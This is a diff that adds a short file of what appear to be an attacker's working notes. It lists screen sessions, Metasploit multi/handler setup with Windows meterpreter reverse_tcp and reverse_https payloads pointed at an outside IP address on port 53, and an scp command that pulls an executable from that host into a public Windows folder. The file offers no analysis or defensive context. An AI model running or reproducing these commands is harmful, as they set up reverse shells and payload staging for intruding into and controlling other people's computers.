@@ -1,0 +1,14 @@
+screen -r kamar5555
+screen -r kamar4444
+______________________________
+screen -r ruanganx64port53
+ screen -r ruanganx64port8181
+
+ use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST 168.144.103.21
+set LPORT 53
+scp root@168.144.103.21:x64P53.exe C:\Users\Public
+
+
